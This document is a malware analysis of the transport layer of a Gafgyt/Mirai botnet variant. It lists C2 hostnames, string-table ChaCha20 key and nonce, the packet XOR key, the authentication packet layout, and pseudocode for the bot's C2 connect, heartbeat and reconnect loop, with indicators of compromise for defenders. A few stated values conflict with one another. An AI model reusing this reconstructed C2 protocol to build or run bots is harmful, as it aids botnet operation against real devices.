# Gafgyt/Mirai Variant Transport Layer Specification

## Sample Identification

- **Binary**: `arm7` (ELF32, ARM Little-Endian)
- **Family**: Gafgyt/Mirai botnet variant
- **Compiler**: GCC 3.3.2 / 4.2.1
- **C Library**: uClibc
- **Image Base**: 0x00008000

---

## 1. C2 Infrastructure Retrieval

### 1.1 C2 Hostnames

The binary contains three C2 hostnames stored in an encrypted string table. These are resolved via DNS at runtime using a custom DNS resolver.

| Index | Address | Length | Decoded Hostname | Purpose |
|-------|---------|--------|------------------|---------|
| 0     | 0x01f2a4| 14     | `marvisxoxo.st`  | Primary C2 |
| 1     | 0x01f2b4| 20     | `valid.marvisxoxo.st` | Secondary C2 |
| 2     | 0x01f2cc| 18     | `tls.marvisxoxo.st`  | TLS C2 variant |

### 1.2 C2 Port Selection

The C2 port is selected from an array stored in the data section. The selection uses a deterministic random algorithm:

```
port_index = (rand_next() * server_count >> 23) * -11 + rand_next()
port = array[port_index] (byte-swapped to network order)
```

The server configuration array is located at `DAT_0000eba0` (22 bytes) with the server count at `DAT_0000eba4`.

**Observed Port Values:**
- Single-instance controller port: `0x04d2` (1234 decimal) — used for local bind to detect duplicate instances
- C2 connection port: Derived from encrypted configuration data

**Note:** The specific C2 port value is embedded in the binary's data section at offset 0x0002912c as `0x07d0` (2000 decimal in little-endian), though the actual C2 port may differ based on build configuration.

### 1.3 DNS Resolution

The malware implements a custom DNS resolver (`resolv_lookup` at 0x0000f088) that:

1. **DNS Server Selection**: Randomly selects from public DNS servers:
   - `1.1.1.1` (Cloudflare) — constant `0x01010101`
   - `8.8.8.8` (Google) — constant `0x08080808`
   - `8.8.4.4` (Google) — stored at `DAT_0000f058`
   - `9.9.9.9` (Quad9) — constant `0x09090909`
   - Additional server at `DAT_0000f05c`

2. **Query Construction**:
   - Creates a standard DNS query packet
   - Transaction ID: Random 16-bit value
   - Flags: `0x0100` (standard query, recursion desired)
   - Questions: 1, Answer RRs: 0, Authority RRs: 0, Additional RRs: 0
   - Query type: A record (0x0001), Class: IN (0x0001)
   - Domain name encoded in DNS label format (length-prefixed)

3. **Resolution Process**:
   - Creates UDP socket (`socket(AF_INET, SOCK_DGRAM, 0)`)
   - Connects to DNS server on port 53
   - Sends query packet
   - Uses `select()` with 5-second timeout for response
   - Parses DNS response to extract A record IP addresses
   - Retries up to 5 times with different DNS servers
   - Returns pointer to structure containing resolved IP(s)

### 1.4 Retrieval Logic (Pseudocode)

```
FUNCTION resolve_c2():
    // Select C2 hostname from encrypted table
    hostname_index = random() % server_count
    hostname = string_table_retrieve(hostname_index)
    
    // Resolve hostname via custom DNS
    dns_result = resolv_lookup(hostname)
    IF dns_result == NULL OR dns_result->ips == EMPTY:
        // Try fallback hostnames
        FOR fallback_index IN [1, 2]:
            fallback_hostname = string_table_retrieve(fallback_index)
            dns_result = resolv_lookup(fallback_hostname)
            IF dns_result != NULL AND dns_result->ips != EMPTY:
                BREAK
    
    // Extract IP from DNS result
    c2_ip = resolv_transform_ip(dns_result->ips[0])
    
    // Select port from configuration array
    port_index = select_random_port()
    c2_port = byte_swap(config_array[port_index])
    
    RETURN (c2_ip, c2_port)
```

---

## 2. Transport Initialization

### 2.1 Connection Establishment

The C2 connection is established in the main select loop with the following sequence:

#### Socket Creation
```c
fd_serv = socket(AF_INET, SOCK_STREAM, 0);  // TCP socket
fcntl(fd_serv, F_GETFL);
fcntl(fd_serv, F_SETFL, flags | O_NONBLOCK);  // Non-blocking mode
```

#### Server Address Construction
```c
srv_addr.sa_family = AF_INET;  // 2
srv_addr.sa_data[0] = port >> 8;    // Port high byte (network order)
srv_addr.sa_data[1] = port & 0xFF;  // Port low byte
srv_addr.sa_data[2] = ip & 0xFF;    // IP byte 0
srv_addr.sa_data[3] = (ip >> 8) & 0xFF;  // IP byte 1
srv_addr.sa_data[4] = (ip >> 16) & 0xFF; // IP byte 2
srv_addr.sa_data[5] = (ip >> 24) & 0xFF; // IP byte 3
```

#### Connection Attempt
```c
connect(fd_serv, &srv_addr, sizeof(sockaddr));
```

### 2.2 Network Parameters

| Parameter | Value | Description |
|-----------|-------|-------------|
| Protocol | TCP (AF_INET, SOCK_STREAM) | Stream-oriented connection |
| Socket Mode | Non-blocking | O_NONBLOCK flag set |
| Select Timeout | 10 seconds | `timeval {tv_sec: 0x0f, tv_usec: 0}` |
| Receive Buffer | 1024 bytes | `recv(fd_serv, buf, 0x400, MSG_NOSIGNAL)` |
| Send Flags | MSG_NOSIGNAL | `0x4000` — prevent SIGPIPE |

### 2.3 Reconnection Strategy

When the C2 connection fails or is lost:

```
IF connection_error OR recv_returns_0:
    IF errno != EINTR (4) AND errno != EAGAIN (11):
        close(fd_serv)
        fd_serv = -1
        delay = random() + (random() * seed >> 23) * -10 + 1
        sleep(delay)  // Random backoff between 1-11 seconds
```

**Reconnection Behavior:**
- On error: Close socket, set fd_serv to -1, sleep with random delay
- On timeout (select returns 0): Continue loop, send heartbeat if due
- Maximum retry: No explicit limit — infinite reconnection loop

### 2.4 Connection Logic (Pseudocode)

```
FUNCTION connect_to_c2():
    fd_serv = socket(AF_INET, SOCK_STREAM, 0)
    IF fd_serv == -1:
        RETURN FAILURE
    
    // Set non-blocking
    flags = fcntl(fd_serv, F_GETFL)
    fcntl(fd_serv, F_SETFL, flags | O_NONBLOCK)
    
    // Build server address
    (c2_ip, c2_port) = resolve_c2()
    srv_addr = build_sockaddr(c2_ip, c2_port)
    
    // Initiate connection
    pending = TRUE
    connect(fd_serv, &srv_addr, sizeof(srv_addr))
    
    RETURN fd_serv  // Connection in progress (non-blocking)

FUNCTION main_loop():
    WHILE TRUE:
        // Prepare fd_sets for select
        read_set = EMPTY
        write_set = EMPTY
        
        // Add control socket (single-instance check)
        IF fd_ctrl != -1:
            FD_SET(fd_ctrl, read_set)
        
        IF fd_serv == -1:
            fd_serv = connect_to_c2()
            FD_SET(fd_serv, read_set)
            FD_SET(fd_serv, write_set)
        ELSE IF pending:
            FD_SET(fd_serv, write_set)
        ELSE:
            FD_SET(fd_serv, read_set)
        
        // Select with 10-second timeout
        result = select(max_fd + 1, read_set, write_set, NULL, {10, 0})
        
        IF result == 0:
            // Timeout — send heartbeat
            heartbeat_counter++
            IF heartbeat_counter % 6 == 0:
                send(fd_serv, "\x00\x00", 2, MSG_NOSIGNAL)
        
        ELSE IF result > 0:
            // Handle control socket (single-instance kill)
            IF FD_ISSET(fd_ctrl, read_set):
                accept(fd_ctrl, ...)
                kill(-session_id, SIGKILL)
                exit(0)
            
            IF pending:
                IF FD_ISSET(fd_serv, write_set):
                    // Connection established or failed
                    error = getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, ...)
                    IF error == 0:
                        pending = FALSE
                        build_and_send_authentication(fd_serv, password)
                    ELSE:
                        close(fd_serv)
                        fd_serv = -1
                        sleep(random_delay())
                ELSE IF FD_ISSET(fd_serv, read_set):
                    close(fd_serv)
                    fd_serv = -1
                    sleep(random_delay())
            
            ELSE:
                // Connected — receive data
                IF FD_ISSET(fd_serv, read_set):
                    bytes = recv(fd_serv, buffer, 1024, MSG_NOSIGNAL)
                    IF bytes < 1:
                        IF errno != EINTR AND errno != EAGAIN:
                            close(fd_serv)
                            fd_serv = -1
                            sleep(1)
                    ELSE:
                        xor_decrypt(buffer, bytes, 0xED)
                        IF NOT is_auth_packet(buffer):
                            attack_parse(buffer, bytes)
                        memset(buffer, 0, 1024)
```

---

## 3. String Table Analysis

### 3.1 Encryption Scheme

The string table uses **ChaCha20** stream cipher with the following parameters:

| Parameter | Value | Location |
|-----------|-------|----------|
| Key | 32 bytes | 0x000290fc (.data section) |
| Nonce | 12 bytes (96-bit) | 0x0002911c (.data section) |
| Counter | 1 (not 0) | Hardcoded in xor_add |
| Block Size | 64 bytes | Standard ChaCha20 |

**Key** (hex): `5a3f2e7b 8c9d0a6e 3b4f7c8a 1d5c2b0d 6f1a0c3e 2d8e4a09 1c7e5a4d 3c2b6a08`

**Nonce** (hex): `4a1b00ff 2d7c3a12 00010305`

### 3.2 String Table Structure

The string table is initialized by `xor_init()` (0x0000b204) which:

1. Allocates a table of 157 entries (0x9d), each 12 bytes:
   - 4 bytes: Pointer to encrypted string data
   - 4 bytes: String length
   - 4 bytes: Reserved/flags

2. For each entry, calls `xor_add(index, encrypted_data_ptr, length)`:
   - Duplicates the encrypted string
   - Stores pointer and length in table
   - Decrypts in-place using ChaCha20
   - Null-terminates the decrypted string

### 3.3 Decryption Routine (Pseudocode)

```
FUNCTION chacha20_decrypt(key[32], nonce[12], ciphertext, length):
    // Initialize ChaCha20 state
    state[0..3]  = "expand 32-byte k"  // Constants: 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574
    state[4..11] = key[0..31]          // 8 x 32-bit words (little-endian)
    state[12]    = 1                   // Counter (NOT 0)
    state[13..15]= nonce[0..11]        // 3 x 32-bit words (little-endian)
    
    plaintext = EMPTY
    
    FOR block_offset FROM 0 TO length STEP 64:
        // Generate keystream block
        working_state = COPY(state)
        
        // 20 rounds (10 double-rounds)
        FOR round FROM 1 TO 10:
            quarter_round(working_state, 0, 4,  8, 12)
            quarter_round(working_state, 1, 5,  9, 13)
            quarter_round(working_state, 2, 6, 10, 14)
            quarter_round(working_state, 3, 7, 11, 15)
            quarter_round(working_state, 0, 5, 10, 15)
            quarter_round(working_state, 1, 6, 11, 12)
            quarter_round(working_state, 2, 7,  8, 13)
            quarter_round(working_state, 3, 4,  9, 14)
        
        // Add original state
        FOR i FROM 0 TO 15:
            keystream[i] = working_state[i] + state[i]
        
        // XOR with ciphertext
        block_len = MIN(64, length - block_offset)
        FOR i FROM 0 TO block_len - 1:
            plaintext[block_offset + i] = ciphertext[block_offset + i] XOR keystream_byte(i)
        
        state[12] = state[12] + 1  // Increment counter
    
    RETURN plaintext

FUNCTION quarter_round(state, a, b, c, d):
    state[a] = state[a] + state[b]
    state[d] = ROTL(state[d] ^ state[a], 16)
    state[c] = state[c] + state[d]
    state[b] = ROTL(state[b] ^ state[c], 12)
    state[a] = state[a] + state[b]
    state[d] = ROTL(state[d] ^ state[a], 8)
    state[c] = state[c] + state[d]
    state[b] = ROTL(state[b] ^ state[c], 7)
```

### 3.4 Recovered Strings

| Index | Address | Length | Decoded String | Purpose |
|-------|---------|--------|----------------|---------|
| 0     | 0x01f2a4| 14     | `marvisxoxo.st` | Primary C2 hostname |
| 1     | 0x01f2b4| 20     | `valid.marvisxoxo.st` | Secondary C2 hostname |
| 2     | 0x01f2cc| 18     | `tls.marvisxoxo.st` | TLS C2 hostname |
| 3     | 0x01f2e0| 6      | `.ffdfd` | File extension |
| 4     | 0x01f2e8| 9      | `dvrLocker` | Process identifier |
| 5     | 0x01f2f4| 9      | `dvrInside` | Process identifier |
| 6     | 0x01f300| 6      | `.ffhhd` | File extension |
| 7     | 0x01f308| 7      | `kill -9` | Kill command |
| 8     | 0x01f310| 31     | `The Next Station Is... Shibuya` | Startup banner |
| 9     | 0x01f330| 32     | `Segmentation fault (core dumped)` | Fake error message |

**Note:** Strings 10-18 contain binary data (function pointers or binary payloads) and are not printable ASCII.

### 3.5 Packet Encryption/Decryption

All C2 communication uses simple XOR encryption with key `0xED`:

```
FUNCTION xor_encrypt(data, length, key):
    FOR i FROM 0 TO length - 1:
        data[i] = data[i] XOR key

// Incoming packets: xor_encrypt(buffer, bytes, 0xED)
// Outgoing auth packet: xor_encrypt(payload, length, 0xED)
```

---

## 4. Authentication Protocol

### 4.1 Authentication Packet Structure

Sent upon successful C2 connection:

| Offset | Size | Content | Description |
|--------|------|---------|-------------|
| 0      | 19   | Header  | Pre-built auth header from `bot_authentication_headers` |
| 19     | N    | Password | C2 password from argv[1] or default |
| 19+N   | 1    | CPU count | From /proc/cpuinfo or sysconf(_NPROCESSORS_ONLN) |
| 20+N   | 2    | Checksum | Internet checksum of XOR-encrypted payload |

### 4.2 Authentication Header (from 0x0001fb5c)

```
0A 0B 0C 0D 0E 0F 00 03 02 01 02 03 04 05 05 04 03 02 01 00
```

Followed by path strings:
- `/maps` (for /proc/[pid]/maps)
- `/lib/` (library path)
- `/proc/net/tcp` (network connection table)

### 4.3 Authentication Logic (Pseudocode)

```
FUNCTION build_authentication(fd, password):
    // Determine CPU count
    cpu_count = count_processors()
    
    // Build auth packet
    packet[0..18]  = auth_header  // 19 bytes from .rodata
    packet[19..19+N-1] = password
    packet[19+N]   = cpu_count - 1
    
    // XOR encrypt payload (bytes 19 onwards)
    payload_len = N + 1
    xor_encrypt(packet[19], payload_len, 0xED)
    
    // Calculate checksum
    checksum = internet_checksum(packet[19], payload_len / 2)
    packet[19+N+1..19+N+2] = checksum
    
    // Send complete packet
    send(fd, packet, 19 + N + 3, MSG_NOSIGNAL)
    
    // Clean up
    memset(packet, 0, 64)
```

---

## 5. Heartbeat Protocol

### 5.1 Heartbeat Packet

- **Content**: Two null bytes `\x00\x00`
- **Interval**: Every 60 seconds (6 × 10-second select timeouts)
- **Send Function**: `send(fd_serv, "\x00\x00", 2, MSG_NOSIGNAL)`

### 5.2 Heartbeat Logic

```
heartbeat_counter = 0

WHILE connected:
    result = select(..., timeout=10s)
    
    IF result == 0:  // Timeout
        heartbeat_counter++
        IF heartbeat_counter % 6 == 0:
            send(fd_serv, "\x00\x00", 2, MSG_NOSIGNAL)
```

---

## 6. Single-Instance Control

### 6.1 Local Controller Socket

The malware binds to a local port to detect duplicate instances:

- **Port**: `0x04d2` (1234 decimal)
- **Socket Type**: TCP, non-blocking
- **Behavior**: 
  - On bind success: Listen for connections
  - On bind failure (EADDRINUSE = 99): Another instance exists, terminate
  - On incoming connection: Kill entire process group and exit

### 6.2 Single-Instance Logic

```
FUNCTION ensure_single_instance():
    fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, 1)
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK)
    
    addr = sockaddr_in(port=0x04d2, ip=INADDR_ANY)
    
    IF bind(fd_ctrl, addr) == -1:
        IF errno == EADDRINUSE:
            // Another instance exists
            connect_to_existing_and_exit()
        kill_services_on_port(0xd204)
        sleep(5)
        ensure_single_instance()  // Retry
    ELSE:
        listen(fd_ctrl, 1)
        RETURN SUCCESS
```

---

## 7. Analysis Gaps

### 7.1 Undetermined Parameters

| Parameter | Status | Reason |
|-----------|--------|--------|
| Exact C2 port | Partially determined | Port selection logic uses encrypted config; default value 0x07d0 (2000) observed but actual C2 port may vary |
| Full string table | Partially decrypted | Only first 19 strings decrypted; remaining strings require reading more binary data |
| Default password | Unknown | Retrieved from argv[1] or DAT_0000eb74; actual value not determined |
| Attack command protocol | Not documented | Beyond scope of transport layer analysis |

### 7.2 Limitations

- The ChaCha20 decryption was validated for the first 19 strings; complete table requires additional binary data extraction
- The C2 port selection array contents are not fully resolved due to pointer indirection through the GOT
- The authentication header's complete semantic meaning is partially inferred from binary content

---

## 8. Summary of IOCs

| Category | Value |
|----------|-------|
| C2 Hostname 1 | `marvisxoxo.st` |
| C2 Hostname 2 | `valid.marvisxoxo.st` |
| C2 Hostname 3 | `tls.marvisxoxo.st` |
| Single-Instance Port | 1234 (0x04d2) |
| DNS Servers | 1.1.1.1, 8.8.8.8, 8.8.4.4, 9.9.9.9 |
| ChaCha20 Key | `5a3f2e7b8c9d0a6e3b4f7c8a1d5c2b0d6f1a0c3e2d8e4a091c7e5a4d3c2b6a08` |
| ChaCha20 Nonce | `4a1b00ff2d7c3a1200010305` |
| Packet XOR Key | `0xED` |
| Heartbeat Interval | 60 seconds |
| Select Timeout | 10 seconds |
| Banner String | `The Next Station Is... Shibuya` |
